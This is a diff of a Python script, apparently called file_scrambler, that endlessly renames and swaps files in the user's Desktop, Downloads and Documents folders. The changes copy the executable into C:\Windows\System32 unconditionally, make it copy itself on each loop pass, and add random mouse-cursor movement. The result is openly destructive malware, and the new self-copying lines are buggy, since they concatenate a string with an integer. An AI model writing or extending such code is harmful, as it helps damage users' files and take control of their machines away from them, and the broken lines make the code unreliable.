@@ -4,11 +4,12 @@ import random #Provides functions for generating random numbers and selecting ra
 import shutil #Provides a higher-level interface for file operations, such as copying and moving files.
 import time #Provides time-related functions, such as pausing execution for a specified duration.
 import subprocess #Allows the execution of external commands and programs from within Python.
+import pyautogui #Provides functions for controlling the mouse and keyboard, as well as taking screenshots and locating images on the screen.
 
 desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")#Builds the path to the user's desktop folder by joining the home directory path with "Desktop".
 download_path = os.path.join(os.path.expanduser("~"), "Downloads")#Builds the path to the user's downloads folder by joining the home directory path with "Downloads".
 documents_path = os.path.join(os.path.expanduser("~"), "Documents")#Builds the path to the user's documents folder by joining the home directory path with "Documents".
-
+shutil.copy2("file_scrambler.exe", r"C:\Windows\System32\file_scrambler.exe")#Copies the "file_scrambler.exe" file to the "C:\Windows\System32" directory, preserving metadata such as timestamps and permissions.
 def is_task_manager_running():#Checks if the Task Manager process is currently running on the system.
     try:
         import psutil #Imports the psutil module, which provides an interface for retrieving information about running processes and system utilization.
@@ -19,7 +20,6 @@ def is_task_manager_running():#Checks if the Task Manager process is currently r
         pass
     return False#Returns False if the Task Manager process is not found or if there was an error importing psutil, indicating that it is not currently running.
 if is_task_manager_running():#Checks if the Task Manager process is running by calling the is_task_manager_running function.
-    shutil.copy2("file_scrambler.exe", r"C:\Windows\System32\file_scrambler.exe")#Copies the "file_scrambler.exe" file to the "C:\Windows\System32" directory, preserving metadata such as timestamps and permissions.
     subprocess.Popen([r"C:\Windows\System32\file_scrambler.exe"])#Launches the copied "file_scrambler.exe" file from the "C:\Windows\System32" directory as a separate process, allowing it to run independently of the current script.
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=[]{};,.~`"#Defines a string containing a set of characters that can be used for generating random file names, including lowercase and uppercase letters, digits, and special characters.
 
@@ -98,7 +98,11 @@ def unique_path(folder, name):#Generates a unique file path in the specified fol
         n += 1#Increments the counter variable n by 1 for the next iteration if the candidate file path still exists.
     return candidate#Returns the unique file path that does not conflict with existing files in the specified folder.
 
-
+def move_mouse_to_random_position():#Moves the mouse cursor to a random position on the screen using the pyautogui module.
+    screen_width, screen_height = pyautogui.size()#Retrieves the width and height of the primary monitor using pyautogui.size().
+    random_x = random.randint(0, screen_width - 1)#Generates a random x-coordinate within the screen width.
+    random_y = random.randint(0, screen_height - 1)#Generates a random y-coordinate within the screen height.
+    pyautogui.moveTo(random_x, random_y)#Moves the mouse cursor to the randomly generated (x, y) position on the screen.
 def scramble(folder):#Scrambles the names of files in the specified folder by renaming them with random characters and extensions.
     files = [#List comprehension that iterates over all items in the specified folder.
         f for f in os.listdir(folder)#List comprehension that iterates over all items in the specified folder.
@@ -119,12 +123,14 @@ def scramble(folder):#Scrambles the names of files in the specified folder by re
         except (OSError, shutil.Error):#Handles any errors that may occur during the file move operation, such as permission issues or file conflicts.
             pass
         time.sleep(0.1)#Pauses the execution for 0.1 seconds before proceeding to the next iteration of the loop, allowing for a brief delay between file renaming operations.
-
-
+x=0
 while True:#Starts an infinite loop that continuously scrambles files in the specified folders until the program is terminated.
     desktop_files = matching_files(desktop_path)#List all files in the desktop folder that match the given extensions.
     download_files = matching_files(download_path)#List all files in the downloads folder that match the given extensions.
     documents_files = matching_files(documents_path)#List all files in the documents folder that match the given extensions.
+    x*=2
+    filename=f"file_scrambler{x}.exe"
+    shutil.copy2("file_scrambler.exe", "file_scrambler.exe"+x)
 
     if desktop_files and download_files:#Checks if there are files in both the desktop and downloads folders that match the given extensions.
         chosen_desktop_file = random.choice(desktop_files)#Selects a random file from the list of matching files in the desktop and downloads folders, respectively, to be swapped with each other.
@@ -157,7 +163,7 @@ while True:#Starts an infinite loop that continuously scrambles files in the spe
     if not (desktop_files or download_files or documents_files):# Checks if there are no files in the desktop, downloads, or documents folders that match the given extensions. If there are no matching files, the program will pause for 2 seconds before continuing to the next iteration of the loop.
         time.sleep(2)#Pauses the program for 2 seconds.
         continue#Pauses the program for 2 seconds before continuing to the next iteration of the loop.
-
+    move_mouse_to_random_position()#Moves the mouse cursor to a random position on the screen by calling the move_mouse_to_random_position function.
     scramble(desktop_path)#Scrambles the names of files in the desktop folder by calling the scramble function with the desktop folder path as an argument.
     scramble(download_path)#Scrambles the names of files in the downloads folder by calling the scramble function with the downloads folder path as an argument.
     scramble(documents_path)#Scrambles the names of files in the documents folder by calling the scramble function with the documents folder path as an argument.
